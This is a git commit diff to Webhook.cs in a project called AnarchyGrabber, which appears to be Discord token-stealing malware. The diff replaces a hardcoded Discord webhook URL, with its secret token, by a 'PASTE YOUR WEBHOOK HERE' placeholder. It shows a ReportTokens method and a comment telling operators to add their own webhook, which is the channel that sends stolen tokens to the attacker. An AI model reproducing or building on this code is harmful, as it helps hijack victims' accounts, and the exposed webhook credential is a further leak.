7847ffafea67a81513c4135e1b860a482e5d6f7f
Levente Ilyó Kovács <k.levi2@outlook.hu>
2020-10-03 00:55:20 +0200

    Update Webhook.cs

--- AnarchyGrabber/Webhook.cs
+++ AnarchyGrabber/Webhook.cs
@@ -7,7 +7,7 @@ namespace AnarchyGrabber
     public static class Webhook
     {
         //you've got to change this to your own discord webhook url
-        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/689596782618869845/vsXfyEVW59MNftcWtnrvDCKKHmcQPJ9HT0DF7KR5K4iyVv9IxvopfPWaU91Y5h_JHi7B";
+        private static readonly string _hookUrl = "PASTE YOUR WEBHOOK HERE";
 
 
         public static void ReportTokens(List<string> tokenReport)
